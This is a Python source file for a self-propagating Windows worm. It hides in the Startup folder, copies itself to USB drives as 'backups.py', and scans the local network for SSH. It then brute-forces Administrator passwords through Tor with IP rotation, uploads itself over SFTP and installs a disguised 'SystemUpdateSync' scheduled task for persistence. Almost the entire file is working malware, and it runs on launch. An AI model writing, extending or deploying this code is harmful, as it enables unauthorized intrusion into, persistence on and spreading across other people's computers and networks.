

# RMH

import os
import psutil
import nmap
import time
import paramiko
import msvcrt
import sys
import socks  # PySocks
import logging
import netifaces
import socket
import zipfile
import requests
import subprocess
from stem import Signal
from stem.control import Controller
from threading import *
from shutil import copy2

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
gws = netifaces.gateways()
gateway = None
try:
    gateway = gws['default'][netifaces.AF_INET][0]
except Exception as e:
    logger.error(f"Error getting gateway: {e}")
    pass


def setup_tor():
    tor_path = os.path.join(os.environ.get('TEMP'), "tor_bundle")
    tor_exe = os.path.join(tor_path, "tor", "tor.exe")
    
    if os.path.exists(tor_exe):
        logger.debug("Tor already exists. Skipping download.")
        return tor_exe

    # Official URL for Windows Expert Bundle
    url = "https://www.torproject.org/dist/torbrowser/13.0.1/tor-expert-bundle-windows-x86_64.zip"
    
    try:
        logger.debug("Downloading Tor Expert Bundle...")
        response = requests.get(url, stream=True)
        zip_path = os.path.join(os.environ.get('TEMP'), "tor.zip")
        
        with open(zip_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # Extract the bundle
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(tor_path)
        
        os.remove(zip_path) # Clean up zip
        logger.debug("Tor setup complete.")
        return tor_exe
    except Exception as e:
        logger.error(f"Failed to setup Tor: {e}")
        return None
    
def launch_tor(tor_exe):
    try:
        # Launch Tor silently with no window
        # We specify the ControlPort so 'stem' can talk to it
        cmd = [tor_exe, "--ControlPort", "9051", "--SocksPort", "9050", "--HashedControlPassword", ""]
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(5) # Give Tor time to bootstrap
    except Exception as e:
        logger.error(f"Failed to launch Tor: {e}")



def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def hold_mutex():
    """Ensures only one instance of the script runs on this machine."""
    if os.name != 'nt':
        return

    # Create a hidden lock
    lock_file_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'system_sync_v1.lock')
    
    # We don't close this until the script exits
    global lock_file 
    lock_file = open(lock_file_path, 'w')

    try:
        # Try to lock the first byte of the file
        # LK_NBLCK means non-blocking . it fails immediately if already locked
        msvcrt.locking(lock_file.fileno(), msvcrt.LK_NBLCK, 1)
        logger.debug("Mutex acquired. Starting script...")
    except (IOError, OSError):
        # Quiet exit
        print("Script is already active on this system. Exiting.")
        sys.exit(0)


def lower_priority():
    p = psutil.Process(os.getpid())
    if os.name == 'nt':  # windows
        p.nice(psutil.IDLE_PRIORITY_CLASS)
    else:  # For macOS and Linux
        # 20 is the lowest possible priority (nicest to the CPU)
        p.nice(19)

def scan_hosts(port):
    logger.debug(f"Scanning machines on the same network with port {port} open.")
    logger.debug("Gateway: " + gateway)

    port_scanner = nmap.PortScanner()
    port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')

    all_hosts = port_scanner.all_hosts()

    logger.debug("Hosts: " + str(all_hosts))
    return all_hosts

def change_tor_ip(password="hehenice0.0"):
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password=password)
            controller.signal(Signal.NEWNYM)
            # Tor needs a moment to build the new circuit
            time.sleep(controller.get_newnym_wait())
            print("IP Rotation Requested.")
    except Exception as e:
        print(f"Could not rotate IP: {e}")

def connect_to_ssh(host, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    sock = None
    # Only use Tor for non-local IPs
    if not host.startswith(('192.168.', '10.', '172.', '127.')):
        try:
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            sock.settimeout(20)
            sock.connect((host, 22))
        except Exception as e:
            logger.error(f"Proxy connection failed: {e}")
            return False 

    try:
        client.connect(host, port=22, username="Administrator", password=password, sock=sock, timeout=20)
        
        sftp = client.open_sftp()
        # 2. Use a staging path that prob has no permission blocks
        staging_path = "C:/Users/Public/Documents/temp_file.exe"
        sftp.put(sys.executable, staging_path)
        sftp.close()
        # 3. Use the shell to move the file to Startup
        stdin, stdout, stderr = client.exec_command('echo %USERPROFILE%')
        user_home = stdout.read().decode().strip()
        final_destination = fr"{user_home}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\file.exe"

        task_name = "SystemUpdateSync"
        move_cmd = f'schtasks /create /tn "{task_name}" /tr "{staging_path}" /sc onlogon /rl limited /f'

        stdin, stdout, stderr = client.exec_command(move_cmd)

        exit_status = stdout.channel.recv_exit_status() # This waits for it to finish

        if exit_status != 0:
            logger.error(f"Move failed: {stderr.read().decode()}")
        
        logger.debug(f"Moved file from staging to: {final_destination}")

    except paramiko.AuthenticationException:
        logger.error(f"Wrong password for {host}")
        return False
    except paramiko.SSHException as e:
        if "reset" in str(e).lower() or "connection" in str(e).lower():
            if sock: 
                logger.debug("MaxAuthTries likely hit. Rotating Tor...")
                change_tor_ip()
            time.sleep(10)
        return False
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return False

def bruteforce_ssh(host, wordlist):
    wordlist_path = resource_path(wordlist)
    with open(wordlist_path, "r") as file:
        for line in file:
            password = line.strip()
            # Direct connection attempt
            connection = connect_to_ssh(host, password)
            
            if connection:
                logger.debug(f"Password found: {password}")
                return password
            
            # Small delay to prevent overwhelming the target CPU
            time.sleep(2) 
    return None



def spread():
    lower_priority()
    # The target folder on Windows
    bootfolder = os.path.join(os.path.expanduser('~'), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    target_path = os.path.join(bootfolder, "file.exe")

    while True:
        if not os.path.exists(target_path):
            try:
                copy2(__file__, target_path)
                logger.debug("Successfully copied to startup.")
            except Exception as e:
                logger.error(f"Copy failed: {e}")
        
        # 2. Check for external drives (USB spreading)
        try:
            drives = psutil.disk_partitions(all=False)
            for drive in drives:
                if drive.mountpoint == "C:\\":
                    continue # We handled C: above
                
                usb_target = os.path.join(drive.mountpoint, "backups.py")
                if not os.path.exists(usb_target):
                    copy2(__file__, usb_target)
        except Exception as e:
            pass

        # 3. Increase sleep time significantly
        # Checking once every 5 minutes (300s) is plenty for "spreading"
        time.sleep(300)

def start_spread():
    thread = Thread(target = spread)
    thread.start()

def boom():
    hold_mutex()

    tor_bin = setup_tor()
    if tor_bin:
        launch_tor(tor_bin)

    lower_priority()
    start_spread()

    host = socket.gethostbyname(socket.gethostname())
    wordlist = "wordlist.txt"
    bruteforce_ssh(host, wordlist)
    if gateway == None:
        logger.error("No gateway found, cannot scan network.")
        return
    
    else:
        hosts_on_network = scan_hosts(22)
        for host in hosts_on_network:
            if host != socket.gethostbyname(socket.gethostname()):
                bruteforce_ssh(host, wordlist)

boom()